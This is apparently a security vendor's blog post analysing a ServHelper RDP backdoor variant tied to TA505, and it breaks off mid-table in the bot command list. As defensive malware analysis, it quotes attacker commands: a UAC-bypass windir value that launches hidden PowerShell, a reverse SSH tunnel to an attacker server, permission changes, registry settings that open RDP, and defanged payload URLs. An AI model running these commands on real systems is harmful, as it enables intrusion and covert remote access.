Binary Defense meets you at any stage of your journey and helps operationalize XSIAM with precision-built use cases, tailored detection logic, and 24/7 expert support.</p><p class="is-megamenu-col__content-desc has-link"><a href="https://www.binarydefense.com/services/managed-xsiam/" class="menu-item__link">See What Cortex XSIAM Can Really Do</a></p></li>

	<li id="menu-item-10081504" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-10081504"role="menuitem"data-depth="1" data-parent="2914"><a href="https://www.binarydefense.com/michael-kim/" class="menu-item__link"><span class="menu-item__label"><span class="menu-item__content"><span class="menu-item__text">Michael Kim</span></span></span></a></li>
	<li id="menu-item-10079774" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-10079774"role="menuitem"data-depth="1" data-parent="2914"><a href="https://www.binarydefense.com/about-us/events/" class="menu-item__link"><span class="menu-item__label"><span class="menu-item__content"><span class="menu-item__text">Events</span></span></span></a></li>

</ul>
</li>
<li id="menu-item-10079770" class="menu-item menu-item-type-post_type menu-item-object-page current_page_parent menu-item-10079770"role="menuitem"data-depth="0"><a href="https://www.binarydefense.com/resources/blog/" class="menu-item__link"><span class="menu-item__label"><span class="menu-item__content"><span class="menu-item__text">Blog</span></span></span></a></li>
</ul>                            </nav>
                                                            </div>
                <div class="site-header__secondary-menu">

	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2921"role="menuitem"data-depth="1" data-parent="10311"><a href="https://www.binarydefense.com/partnerships/shield-partner-program/" class="menu-item__link"><span class="menu-item__label"><span class="menu-item__content"><span class="menu-item__text">Shield Partner Program</span></span></span></a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2922"role="menuitem"data-depth="1" data-parent="10311"><a href="https://www.binarydefense.com/partnerships/technology-partners/" class="menu-item__link"><span class="menu-item__label"><span class="menu-item__content"><span class="menu-item__text">Technology Partners</span></span></span></a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2920"role="menuitem"data-depth="1" data-parent="10311"><a href="https://www.binarydefense.com/partnerships/become-a-partner/" class="menu-item__link"><span class="menu-item__label"><span class="menu-item__content"><span class="menu-item__text">Become a Partner</span></span></span></a></li>
	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-2923"role="menuitem"data-depth="1" data-parent="10311"><a target="_blank" href="https://partners.binarydefense.com/" class="menu-item__link"><span class="menu-item__label"><span class="menu-item__content"><span class="menu-item__text">Partner Portal Login</span></span></span></a></li>
</ul>
</li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-2914"role="menuitem"aria-haspopup="true" aria-expanded="false" data-depth="0"><a href="https://www.binarydefense.com/about-us/" class="menu-item__link"><span class="menu-item__label"><span class="menu-item__content"><span class="menu-item__text">Company</span></span></span></a>
<ul role="menu" data-depth="0" class="sub-menu">
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-10079769"role="menuitem"data-depth="1" data-parent="2914"><a href="https://www.binarydefense.com/about-us/" class="menu-item__link"><span class="menu-item__label"><span class="menu-item__content"><span class="menu-item__text">About Us</span></span></span></a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-10079773"role="menuitem"data-depth="1" data-parent="2914"><a href="https://www.binarydefense.com/about-us/press-releases/" class="menu-item__link"><span class="menu-item__label"><span class="menu-item__content"><span class="menu-item__text">Press Releases</span></span></span></a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-5252"role="menuitem"data-depth="1" data-parent="2914"><a href="https://www.binarydefense.com/about-us/in-the-news/" class="menu-item__link"><span class="menu-item__label"><span class="menu-item__content"><span class="menu-item__text">In the News</span></span></span></a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-10080606"role="menuitem"data-depth="1" data-parent="2914"><a href="https://www.binarydefense.com/browns/" class="menu-item__link"><span class="menu-item__label"><span class="menu-item__content"><span class="menu-item__text">Cleveland Browns</span></span></span></a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-10081504"role="menuitem"data-depth="1" data-parent="2914"><a href="https://www.binarydefense.com/michael-kim/" class="menu-item__link"><span class="menu-item__label"><span class="menu-item__content"><span class="menu-item__text">Michael Kim</span></span></span></a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-10079774"role="menuitem"data-depth="1" data-parent="2914"><a href="https://www.binarydefense.com/about-us/events/" class="menu-item__link"><span class="menu-item__label"><span class="menu-item__content"><span class="menu-item__text">Events</span></span></span></a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2915"role="menuitem"data-depth="1" data-parent="2914"><a href="https://www.binarydefense.com/about-us/careers/" class="menu-item__link"><span class="menu-item__label"><span class="menu-item__content"><span class="menu-item__text">Careers</span><span class="menu-item__badge" data-color="bright-blue">We're Hiring</span></span></span></a></li>
</ul>
</li>
<li class="menu-item menu-item-type-post_type menu-item-object-page current_page_parent menu-item-10079770"role="menuitem"data-depth="0"><a href="https://www.binarydefense.com/resources/blog/" class="menu-item__link"><span class="menu-item__label"><span class="menu-item__content"><span class="menu-item__text">Blog</span></span></span></a></li>
</ul>                        </nav>
                    </div>
                                    </div>
        <div class="off-canvas__bottom">
                                                <nav class="off-canvas-secondary-menu shared-walker-menu" aria-label="Off-Canvas Secondary Menu">
                        <ul id="off-canvas-secondary-menu" class="menu" role="menu"><li class="will-show-mobile-menu-text-on-mobile menu-item menu-item-type-custom menu-item-object-custom menu-item-2929"role="menuitem"><a href="JavaScript:void(0)" class="menu-item__link j-toggle-search"><span class="menu-item__label"><span class="menu-item__icon material-symbols-outlined" >search</span><span class="menu-item__content"><span class="menu-item__text screen-reader-text">Search</span></span></span></a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2930 has-button"role="menuitem"><a href="https://www.binarydefense.com/contact-us/" class="menu-item__link menu-item__button button">Contact Us</a></li>
</ul>                    </nav>
                                
    <nav class="social-media-menu" aria-label="Social Media Menu">
        <ul class="menu" role="menu">

    <div id="popup-overlay"></div>
</header> <!-- @end #masthead -->


                <div id="primary" class="wrap">
                    <main id="main" class="site-main">

    <header style="background-image: url(https://www.binarydefense.com/wp-content/uploads/2023/04/malware-scaled-1.jpg); --bindef--entry-header-background-opacity: 1;" class="entry-header">
        <div class="entry-header__wrap">
            <div class="entry-header__content">
                                <h1 class="entry-title" itemprop="headline">An Updated ServHelper Tunnel Variant</h1>                                                                <div class="post_date"><div class="post_author">By Binary Defense</div>Published: December 20, 2019<br/>Updated: April 17, 2023</div>                                <p class="byline">By </p>                
            <nav class="social-share-menu" aria-label="Social Share Menu" data-style="default">
        <ul class="menu" role="menu">
                            <li class="share-url-linkedin" role="menuitem">
                    <a href="https://www.linkedin.com/sharing/share-offsite/?url=https://www.binarydefense.com/resources/blog/an-updated-servhelper-tunnel-variant/" rel="noreferrer noopener" target="_blank" title="Share this" aria-label="Share this">
                        <span class="screen-reader-text">Share this</span>
                        <i class="fa-brands fa-linkedin-in" role="presentation" aria-hidden="true"></i>
                    </a>
                </li>
                            <li class="share-url-facebook" role="menuitem">
                    <a href="http://www.facebook.com/sharer.php?u=https://www.binarydefense.com/resources/blog/an-updated-servhelper-tunnel-variant/" rel="noreferrer noopener" target="_blank" title="Share this" aria-label="Share this">
                        <span class="screen-reader-text">Share this</span>
                        <i class="fa-brands fa-facebook" role="presentation" aria-hidden="true"></i>
                    </a>
                </li>
                            <li class="share-url-twitter" role="menuitem">
                    <a href="https://twitter.com/intent/tweet?url=https://www.binarydefense.com/resources/blog/an-updated-servhelper-tunnel-variant/&text=An+Updated+ServHelper+Tunnel+Variant" rel="noreferrer noopener" target="_blank" title="Tweet this" aria-label="Tweet this">
                        <span class="screen-reader-text">Tweet this</span>

                </li>

                        <span class="screen-reader-text">Pin this</span>

                                                            </div>
        </div>
        <div class="entry-breadcrumbs"><p id="breadcrumbs"><span><span><a href="https://www.binarydefense.com/">Home</a></span> » <span><a href="https://www.binarydefense.com/resources">Resources</a></span> » <span><a href="https://www.binarydefense.com/resources/blog/">Blog</a></span> » <span class="breadcrumb_last" aria-current="page"><strong>An Updated ServHelper Tunnel Variant</strong></span></span></p></div>        <div class="entry-header__overlay has-jet-black-background-color"></div>
    </header>

<div class="post-row">
    <div class="post-col">
        
<article class="post-5607 post type-post status-publish format-standard has-post-thumbnail hentry category-blog tag-digital-risk-protection" id="post-5607">
    <div class="entry-content">
        
<p>James Quinn, Threat Researcher for Binary Defense</p>



<h1 class="wp-block-heading">Executive Summary</h1>



<p>Binary Defense Researchers discovered active Command and
Control (C2) servers and a new version of ServHelper, a malicious Remote
Desktop Protocol (RDP) backdoor program known to be used by the threat group
TA505.&nbsp; TA505 is a financially motivated
threat group that has been active since at least 2014.&nbsp; The group is known for frequently changing
malware and driving global trends in criminal malware distribution.&nbsp; (link to MITRE ATT&amp;CK page on TA505: <a href="https://attack.mitre.org/groups/G0092/">https://attack.mitre.org/groups/G0092/</a>).&nbsp; The new version of ServHelper attempts to
evade defenses by tunneling RDP connections through a Secure Shell (ssh)
connection back to the threat actors’ servers. Indications of Compromise (IoCs)
and strategies to increase detection of this new threat are provided at the end
of this report.&nbsp; A complete technical
description of the malware’s operation and layers of protection are detailed
for other malware analysts to use when analyzing and identifying malware
samples found in incident response or threat hunting activities.</p>



<h1 class="wp-block-heading">Malware Sample Discovery</h1>



<p>Binary Defense’s Threat Hunting team recently discovered a
malware distribution server used by the cybercrime group TA505.&nbsp; Stored on that server were various commodity
Remote Access Trojans (RATs) and downloaders, including the downloader Amadey,
which has been known to deliver FlawedAmmyy and EmailStealer.&nbsp; Among the commodity RATs was a file called
“signed.exe” that contained several layers, or stages, of obfuscation to disguise
the final payload: a new variant of ServHelper, TA505’s main downloader and
Remote Desktop Protocol (RDP) backdoor.&nbsp;
The new variant uses OpenSSH to tunnel RDP connections from the victim
computer back to the attacker’s server and includes some new command
options.&nbsp; Refer to the MITRE ATT&amp;CK
page on ServHelper for more background: <a href="https://attack.mitre.org/software/S0382/">https://attack.mitre.org/software/S0382/</a></p>



<h1 class="wp-block-heading">Initial Analysis – a PowerShell Script Packed Using NSIS</h1>



<p>Upon investigating “signed.exe”, the first takeaway is that it is packed using the Nullsoft Scriptable Installer System (NSIS), which is an open source installation package utility.&nbsp; Typically, this form of packer can be easily unpacked by opening the file as a zip file in an unarchiving program and extracting the contents.&nbsp; However, this installer had been modified and cannot be extracted with all unarchivers.&nbsp; 7-zip’s command-line interface (CLI) extractor was the most successful for pulling out the payload stored in signed.exe.&nbsp;  Contained inside of “signed.exe” is a PowerShell script file named premiumlegitYFDTBOHHRX.ps1.&nbsp; Interestingly, the file information for “signed.exe” described it as “premium legit YFDTBOHHRX isntaller”[sic – the malware contained the misspelling of  installer as written].&nbsp; Pivoting off the use of “premium legit” in the signature reveals 20 files that all match “signed.exe” in functionality, uploaded to VirusTotal in early November 2019.&nbsp; Hashes for all matching files are included in the IOC section. </p>



<figure class="wp-block-image size-large"><img decoding="async" src="https://www.binarydefense.com/wp-content/uploads/2023/04/Picture1-1024x345.png" alt=" class="wp-image-23522"/><figcaption>Fig. 1. File Information</figcaption></figure>



<h2 class="wp-block-heading">PowerShell Analysis – Encrypted Binary Data Encoded Using Base64</h2>



<p>The premiumlegitYFDTBOHHRX.ps1 file is a large (3.6MB) file filled with mainly Base64-encoded data.&nbsp; Decoding the Base64-encoded data reveals encrypted binary data.&nbsp; At the end of the script is a small bit of code that takes two supplied arguments, decodes and decrypts the Base64-encoded data using the arguments as keys, then executes the result with an Invoke-Expression call, which indicates that the decrypted result is expected to be PowerShell code.</p>



<figure class="wp-block-image size-large"><img decoding="async" src="https://www.binarydefense.com/wp-content/uploads/2023/04/1-1024x648.png" alt=" class="wp-image-23523"/><figcaption>Fig 2. Binary Decryption</figcaption></figure>



<p>By replacing the Invoke-Expression call with “Write-Output
$VRFJLOKRGX | Out-File Malware.txt”, the malware will do all the difficult
decrypting and then write it to a file for easy analysis.</p>



<h2 class="wp-block-heading">PowerShell Analysis, Part 2 – Decrypted Payloads Include RDP Wrapper and
UAC Bypass </h2>



<p>Just like the first PowerShell script, this script is also massive at 5MB, because it packs so many payloads inside itself.&nbsp; Along with both a 32-bit and 64-bit version of the ServHelper bot and Remote Desktop Protocol (RDP) wrapper, the PowerShell script also includes the User Access Control (UAC) bypass tool called uacme, using DLL files named fubuki32 and fubuki64 also embedded inside.&nbsp; Additionally, there are various config files and other DLLs used by the RDP wrapper. As the PowerShell script is massive, analysis is difficult.&nbsp; However, toward the bottom of the script, the first few commands that are run attempt to query the System Management Bios data tables (SMBiosData), in order to evaluate privilege status.&nbsp; Analysis of the script and testing of  the malware in a controlled environment proved that a function named “heller” is called when the script is executed from a non-privileged user account. </p>



<h1 class="wp-block-heading">Privilege Escalation “heller” Function Analysis</h1>



<p>The heller function serves the purpose of the privilege
escalation for the PowerShell installer.&nbsp;
At the beginning of the function are the uacme DLLs (fubuki32 and
fubuki64), encoded in decimal.&nbsp;
Additionally, heller initializes some optional parameters, which were
unused in this script, but would allow the loading of custom DLLs if they were
used in a different variant.&nbsp; The malware
also uses a simple and elegant technique to determine OS architecture. If the size
of an IntPtr is 4 bytes long, it is a 32-bit system; if an IntPtr is 8 bytes
long, the system must be 64-bit.&nbsp; The
PowerShell script includes both a 32-bit and a 64-bit version of uacme and will
run whichever DLL matches the OS architecture.&nbsp;
These DLLs are modified from the standard uacme; their main purpose is
to relaunch the PowerShell script with the highest privilege level.</p>



<h2 class="wp-block-heading">Privilege Escalation on Windows 7</h2>



<p>Next, the malware looks at what OS version it is running on
and compares it to three strings: “10” for Windows 10, “76” for Windows 7, and
“96” for Windows 8.&nbsp; These strings
ultimately decide which exploit is used to escalate to the highest privilege
level.&nbsp; If Windows 7, the uacme dll is
renamed “Cryptbase.dll”, and is then written to C:WindowsSystem32Sysprep,
and then sysprep.exe is called.&nbsp; This
particular method takes advantage of DLL search order hijacking. When
sysprep.exe is loading its libraries, it will search its current directory
first, where it will locate and load the malicious Cryptbase.dll, thus
triggering the UAC bypass.</p>



<h2 class="wp-block-heading">Privilege Escalation on Windows 8 and Windows 10</h2>



<p>If the script is run in Windows 8 or Windows 10, the malware
will abuse the DiskCleanup utility.&nbsp;
First, the malware will change the environment variable “windir”
(HKCU:/Environment/windir) from the standard value “<a href="file:///Users/C:/Windows">C:Windows” to the following value:</a></p>



<p>powershell -ExecutionPolicy bypass -w hidden -Command
`&#8221;&amp; `&#8217;$pth`&#8217;`&#8221;;&#8221;</p>



<p>where $pth is the full path to the
malicious script to execute.&nbsp; With that
set, it will then run the task MicrosoftWindowsDiskCleanupSilentCleanup,
which will execute the PowerShell script with highest privileges.</p>



<h1 class="wp-block-heading">Analysis of Installer Restarted with Elevated Privileges</h1>



<p>Once the script is running with highest privileges, and after querying the System Management Bios, the install function is executed to install the malware to the victim’s computer.&nbsp; Contained inside the PowerShell script are several buffers of Base64-encoded gzip-compressed data.&nbsp; Decoding and unzipping that data yields more base64 encoded data.&nbsp; That final layer of base64 data appears to be the last layer of encoding.</p>



<figure class="wp-block-image size-large"><img decoding="async" src="https://www.binarydefense.com/wp-content/uploads/2023/04/2-1024x544.png" alt=" class="wp-image-23525"/><figcaption>Fig 2.  Install Buffers</figcaption></figure>



<h2 class="wp-block-heading">Decoding Registry Key and Values into file mstc.reg</h2>



<p>As demonstrated in the above screenshot, the first buffer to
be used is a buffer called “$reg”, which contains a registry key and associated
values.&nbsp; The registry key and values are
decoded using a function named “react” and saved to a file named mstc.reg in
the $TEMP folder.&nbsp; The malware then looks
for the termservice service, and if it doesn’t exist, imports the now decoded
$reg from the file mstc.reg.</p>



<h2 class="wp-block-heading">Decoding and Saving RDPwrap Binary Files and Configuration File to Windows
Mail Folder</h2>



<p>After saving the registry key and values into the mstc.reg
file, several buffers containing additional binaries are initialized. The
variable names are as follows:</p>



<p>$rdp – 32-bit modified <a href="https://github.com/stascorp/rdpwrap">RDPwrap</a><br>$bot&nbsp; &#8211; 32-bit ServHelper<br>$rdp64 – 64-bit modified <a href="https://github.com/stascorp/rdpwrap">RDPwrap</a><br>$bot64 – 64-bit ServHelper<br>$cfg&nbsp; &#8211; RDP wrapper config<br>$clip – legitimate rdpclip.exe<br>$vmt – legitimate rfxvmt.dll</p>



<p>After performing another IntPtr OS architecture check, the corresponding 32-bit or 64-bit versions of RDP wrapper and ServHelper bot are saved to the following locations on disk:</p>



<p>&nbsp;<strong>%ProgramFiles%Windows Mailappcache.xml </strong>(RDPwrap)<br><strong>%ProgramFiles%Windows Maildefault_list.xml</strong> (ServHelper bot)<br>Additionally, the config file is saved to:<br><strong>%ProgramFiles%Windows Mailcleanuptask.cfg</strong>.&nbsp; </p>



<p>Regarding the two legitimate binaries, rdpclip.exe is
necessary for file copy and pasting in an RDP session while rfxvmt.dll is
necessary for Microsoft RemoteFX VM Transport, which adds additional
functionality to RDP, like access to physical Graphics Processing Units (GPUs)
for hardware acceleration.</p>



<p>A search for those 2 files is performed on the computer, and if they are not found, the malware will write them to the system.&nbsp; Additionally, the malware will make the following permission changes:<br>takeown.exe /A /F rfxvmt.dll<br>icacls.exe rfxvmt.dll /inheritance:d<br>icacls.exe rfxvmt.dll /setowner &#8220;NT SERVICETrustedInstaller&#8221;<br>icacls.exe rfxvmt.dll /grant &#8220;NT SERVICETrustedInstaller:F&#8221;</p>



<p>icacls.exe rfxvmt.dll /remove &#8220;NT AUTHORITYSYSTEM&#8221;<br>icacls.exe rfxvmt.dll /grant &#8220;NT AUTHORITYSYSTEM:RX&#8221;</p>



<p>icacls.exe rfxvmt.dll /remove &#8220;BUILTINAdministrators&#8221;<br>icacls.exe rfxvmt.dll /grant &#8220;BUILTINAdministrators:RX&#8221;</p>



<p>These permission changes are necessary for the two dropped DLL files to function properly.</p>



<h1 class="wp-block-heading">Maintaining Persistence</h1>



<p>In order to maintain persistence, the malware first changes
the RDP port from 3389 to 7201.&nbsp; This
aids in hiding traffic, as RDP now communicates from an unexpected port.&nbsp; Additionally, because the Windows Display
Driver Model (WDDM) driver has been known to black screen computers on RDP user
disconnect, the malware disables this.&nbsp;
Also, the modified RDPWrap (appcache.xml) is installed as the
TermService ServiceDll.&nbsp; This modified
RDPWrap will then locate and load the Servhelper bot, while also proxying function
calls to the legitimate Termserv.dll.&nbsp; </p>



<p>With everything installed, the malware then runs the
function “cleanupper”, which removes any .tmp, .ps1, and .txt files stored in
%temp%.&nbsp; Additionally, the malware
restarts the TermServ service, along with the RDPDR service.&nbsp; It also grabs the main username by querying
env:username.&nbsp; It saves this file to a
file called usrnm.txt, which it saves to %tmp%.</p>



<p>The malware is now fully installed and running with SYSTEM level privileges.</p>



<h1 class="wp-block-heading">ServHelper (SSH Tunneling Variant) Analysis</h1>



<p>Originally discovered by Proofpoint in November 2018,
ServHelper is one of TA505’s custom backdoors and downloaders.&nbsp; While the functionality of the two variants
discovered by Proofpoint appeared to be split with one variant acting as a downloader
and the other acting as a backdoor, the variant found in early November 2019
appears to combine aspects of both old variants along with the addition of
browser credential theft.&nbsp; </p>



<h2 class="wp-block-heading">Packed with PeCompact</h2>



<p>In its base form, ServHelper is packed with PeCompact, a
well-known packer used for legitimate software and malware alike.&nbsp; While there are two versions of ServHelper
contained in the PowerShell script—a 32-bit version and a 64-bit version—they
are largely identical and key functionality is the same for both.</p>



<h2 class="wp-block-heading">Anti-Sandbox Evasion Technique: Searching for Microsoft Anti-Virus VM File</h2>



<p>One of the first actions performed by the malware is to
search for the Microsoft Antivirus VM file, aaa_Touchmenot_.txt, which is
stored in the root directory.&nbsp; To get the
value “aaa_Touchmenot_.txt”, the malware must decrypt the string
“w:\yuo_RiirfGsCmn_.rrh”, using a four character Vigenere square cipher.&nbsp; If the malware detects that the AV VM file
exists, the malware quits.&nbsp; The string is
stored in encrypted form likely to evade static detections for that particular
file name.&nbsp; The malware detects if it is
running in an AV sandbox to evade behavior-based automated analysis.</p>



<figure class="wp-block-image size-large"><img decoding="async" src="https://www.binarydefense.com/wp-content/uploads/2023/04/3.png" alt=" class="wp-image-23524"/><figcaption>Fig 3.  Intro</figcaption></figure>



<h2 class="wp-block-heading">Decrypting Bot Configuration for Command and Control</h2>



<p>Next, after determining that the malware is not running in an
AV sandbox, the malware decrypts a series of important strings used for C2
connection.&nbsp; The strings (with a brief
description for each) are below:</p>



<ul class="wp-block-list"><li>lot – XOR network key</li><li>wgautilacc – user account to be installed</li><li>0000999999 – Placeholder</li><li>http:// &#8211; beginning part of main C2 address</li><li>laph.icu – Main C2 Address</li><li>/like/b.php – php file used by C2</li><li>lopottw – malware key</li><li>VXVRPCHJ – Name of file dropped by malware that
contains profile information</li><li>service1.exe – Renamed ssh.exe</li><li>shhhfjsiagguud.icu – Backup C2</li><li>fdg4a35ggs.pw – Backup C2</li><li>nov5 – BotID</li><li>jun12 – Backup BotID</li><li>000009999999 – Placeholder</li><li>http://almagel[.]icu/cp.exe – Profile Swap
information</li><li>http://almagel[.]icu/ssh.zip – ssh backup</li><li>http://gabardina[.]xyz/log.txt – Encrypted
NetSupport RAT</li><li>c:windowstemp &#8211; Drop location</li><li>updsvc.exe – Renamed update service</li><li>fesdg – password for cp.exe</li><li>http://kuarela[.]xyz/1.txt – Unused C2</li></ul>



<p>Many of the functions used by this RAT are formatted like
this. The malware decrypts the strings to be used in the beginning of the
function.&nbsp; </p>



<h2 class="wp-block-heading">Verifying Runtime Environment and Locating Saved Values in Temp File</h2>



<p>Next, after decrypting a few more strings used by the malware
in startup, the malware checks that the command line arguments do not contain
“asfofhr”, “fsfifh4a”, or “huff”. The first two strings are the names of
exported functions in the DLL, while the name “huff” is not an exported
function name and may be either a leftover from a previous version or a placeholder
meant for a new version. Next, the malware will search for a file named
VXVRPCHJ, stored in %temp%, which contains the following information:</p>



<ul class="wp-block-list"><li>botid</li><li>OSVERSION</li><li>architecture</li><li>ComputerName</li><li>Username</li><li>AddedUsername</li><li>AddedPassword</li><li>Number</li></ul>



<p>For example, in the analyzed sample, the file named VXVRPCHJ
contained the following:</p>



<p>nov5;Windows 10 (Version 10.0, Build 18362, 64-bit
Edition);x64;DESKTOP-&lt;REDACTED&gt;$;&lt;REDACTED&gt;;winacc:wgautilacc;8r7aIf0j;78874</p>



<p>If VXVRPCHJ file exists, the malware will then parse out that
information and continue. If VXVRPCHJ does not exist, the malware will run its
install function.</p>



<h2 class="wp-block-heading">ServHelper Install Function</h2>



<p>The ServHelper install function has one goal: to install the
user account used by the threat actor, as well as ensuring that RDP is set up
fully for the threat actor’s uses.&nbsp; As a
result, one of the first actions taken by this function is to enumerate groups
contained on the computer and to also add the threat actor account to the
computer.&nbsp; </p>



<p>First, the local group install function decrypts the SID’s
related to both the Administrators Group (S-1-5-32-544) as well as the Remote
Desktop Users group (S-1-5-32-555), and then uses them to enumerate said
groups.&nbsp; From there, the malware adds the
threat actor account to both Administrators group as well as the Remote Desktop
Users group. This allows them to remotely connect to the infected machine.</p>



<h2 class="wp-block-heading">Setting RDP Configuration Options</h2>



<p>With the threat actor account created and added to the admins
and RDP groups, the malware moves to ensuring RDP is configured in the proper
way.&nbsp; This involves changing the
following registry key values for SYSTEMCurrentControlSetControlTerminal Server
:</p>



<ul class="wp-block-list"><li>fDenyTSConnections – Set to 0, this allows Term
Service connections</li><li>FSingleSessionPerUser – Set to 1, this forces
each newly connected user to use the same session</li></ul>



<p>For SYSTEMCurrentControlSetControlLsa:</p>



<ul class="wp-block-list"><li>LimitBlankPasswordUse – Set to 0, allows users
without a password to remotely connect</li></ul>



<p>For SYSTEMCurrentControlSetControlTerminal
ServerLicensing Core:</p>



<ul class="wp-block-list"><li>EnableConcurrentSessions – Set to 1, allows for
simultaneous connections of multiple remote users at once</li></ul>



<p>For SOFTWAREMicrosoftWindows NTCurrentVersionWinlogon:</p>



<ul class="wp-block-list"><li>AllowMultipleTSSessions – Set to 1, allows for
multiple Terminal Service connections at one time</li></ul>



<p>For SOFTWAREMicrosoftWindows
NTCurrentVersionWinlogonSpecialAccountsUserList:</p>



<ul class="wp-block-list"><li>Add wgautilacc to this list of accounts</li></ul>



<p>For SoftwarePoliciesMicrosoftWindows NTTerminal Services:</p>



<ul class="wp-block-list"><li>fAllowToGetHelp – Set to 1, which allows the
victim computer to “receive help from a friend or a support professional”</li></ul>



<p>With RDP properly set up, the malware shifts to creating the
VXVRPCHJ file that it searches for to check if installation was
successful.&nbsp; </p>



<h2 class="wp-block-heading">Creating VXVRPCHJ File to Store Saved Values</h2>



<p>First, the malware checks usrnm.txt, which was dropped by
the PowerShell script.&nbsp; Next, it
enumerates architecture type by checking the value of the environment variable
&#8220;ProgramW6432”.&nbsp; If the environment
variable has a value, the architecture is 64-bit.&nbsp; If not, the architecture is 32-bit.&nbsp; The malware also grabs the botid, OS type,
and threat actor account info, which it then saves to VXVRPCHJ, in the
format&nbsp; </p>



<ul class="wp-block-list"><li>botid</li><li>OSVERSION</li><li>architecture</li><li>ComputerName</li><li>Username</li><li>AddedUsername</li><li>AddedPassword</li><li>Number</li></ul>



<h2 class="wp-block-heading">Non-Main Threads – Accessing Chrome Browser Profiles and Keylogger Thread</h2>



<p>With the malware fully installed, it then moves to executing
the non-main threads.&nbsp; The first thread
to be executed launches the exported DLL function named “fsfifh4fa”, which is
used by the malware to access the victim’s Chrome web browser user
profiles.&nbsp; This export accepts the
following commands: nouac, chrome, launch.&nbsp;
</p>



<p>Additionally, the malware launches the keylog thread, which
executes the bot DLL with the export “huff”.&nbsp;
Huff is interesting because in the analyzed version of this malware,
huff does not exist.&nbsp; However, it is used
throughout the malware for keylogging purposes.&nbsp;
If huff did exist, the malware would save the logged keys to a file
stored in temp called “mod.txt”.&nbsp; This
may represent planned future functionality for the malware.</p>



<h1 class="wp-block-heading">ServHelper Main Threads</h1>



<p> With the export and keylogging threads setup (if the DLL implements a keylogger function), the malware first decrypts a string that translates to “main thread”, before creating two threads.&nbsp; The first thread seems to be in charge of all communication as well as all commands that the C2 can run when communicating back to the bot.&nbsp; The next thread is in charge of opening an SSH tunnel  </p>



<p>to send all RDP traffic back to the C2.&nbsp; This thread is also in charge of ensuring
that the tunnel stays open.&nbsp; </p>



<h2 class="wp-block-heading">OpenSSH Tunnel Thread</h2>



<p>As this thread is in charge of installing the tunnel as well
as ensuring the tunnel stays open, the function will first enumerate all
processes and step through them in order to ensure that the openssh.exe is not
already running (indicating an open tunnel).&nbsp;
Additionally, the malware searches for the openssh binary.&nbsp; If neither are found, the malware downloads
ssh from the ssh backup C2 and then opens a ssh tunnel using the following
command:</p>



<p><strong>openssh.exe
-N -R :localhost:7201 tunnel@&nbsp; -o
&#8220;StrictHostKeyChecking=no&#8221; -o &#8220;ExitOnForwardFailure=yes&#8221; -o
&#8220;ServerAliveInterval=5&#8221; -o &#8220;ServerAliveCountMax=1&#8221;</strong></p>



<p>The command uses -N to instruct ssh to not execute a command
on the remote server.&nbsp; Additionally, it
uses -R to allow localhost:7201 to be tunneled to the ssh server.&nbsp; Finally, it sets the command line options
like StrictHostKeyChecking, using -o.&nbsp;
With the tunnel properly installed, the malware will decrypt “tun ok on
server”, and send that string, the port that the tunnel exists on, along with
the Process ID (PID) of the tunnel openssh process back to the C2.</p>



<h2 class="wp-block-heading">Communication Thread – Using HTTP or HTTPS to Communicate with the C2
Server</h2>



<p>This thread is in charge of communicating back to the C2 as
well as parsing and executing any commands sent back from the C2 server.&nbsp; Communication is encrypted with a XOR key
decrypted in the C2 function.&nbsp;
Additionally, data sent by the bot to the C2 is also encoded with
base64.&nbsp; </p>



<p>In order to establish connection with the C2, the bot must
first decrypt the following user-agent:</p>



<p>Mozilla/5.0 (Windows NT 10.0;
Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0</p>



<p>The malware uses the following
arguments which are passed to the C2 php script in a POST request:</p>



<ul class="wp-block-list"><li>key=</li><li>sysid=</li><li>resp=</li><li>rights=</li><li>misc=</li></ul>



<p>The malware will encrypt all
traffic using the multi-bit XOR key, “LOT” (hex: 4c 4f 54).&nbsp; It will also encode all of its responses with
base64 to aid in hiding the traffic.&nbsp; All
traffic is sent over https using Let’s Encrypt issued certificates.&nbsp; In order to help with analysis, the malware
was executed on a test machine with all network traffic redirected to a local
analysis computer for capture and viewing. Additionally, modifications were
made to the code to force http instead of https. The screenshot below shows a
message sent from the malware to its C2 server:</p>



<figure class="wp-block-image size-large"><img decoding="async" src="https://www.binarydefense.com/wp-content/uploads/2023/04/4-1024x234.png" alt=" class="wp-image-23526"/><figcaption>Fig 4. POST data</figcaption></figure>



<p>The data translates to</p>



<ul class="wp-block-list"><li>key: lopottw</li><li>sysid: nov5;Windows 10 (Version 10.0, Build
18362, 64-bit
Edition);x64;&lt;REDACTED&gt;$;&lt;REDACTED&gt;;winacc:wgautilacc;yFGxsd8q;47354</li><li>resp: nop ok</li><li>rights: ffff</li></ul>



<p>After receiving a response from the server, the malware
parses the response and compares it to a series of commands in order to decide
what to do with the response.&nbsp; In the
above request, the server issued the “nop” command, which is the heartbeat
equivalent command for this malware.</p>



<h2 class="wp-block-heading">Commands Accepted by the Bot</h2>



<p>This malware has around 30 commands that the C2 can send to interact with the malware.&nbsp; While many of these commands have been discussed in the Proofpoint analysis, a few of these are new and will be discussed in further depth later in this analysis.&nbsp; The total list of commands are as follows:</p>



<figure class="wp-block-table"><table class="><tbody><tr><td>
  <strong>Command</strong>
  </td><td>
  <strong>Description</strong>
  </td></tr><tr><td>
  bk
  </td><td>
  Set up tunnel with specified C2 address instead of
  hardcoded C2 address
  </td></tr><tr><td>
  info
  </td><td>
  Obtain information about the infected victim
  </td></tr><tr><td>
  fixrdp
  </td><td>
  Fix RDP keys, as performed in the install function
  </td></tr><tr><td>
  updateuser
  </td><td>
  Update threat actor’s added account username and
  password
  </td></tr><tr><td>
  deployns
  </td><td>
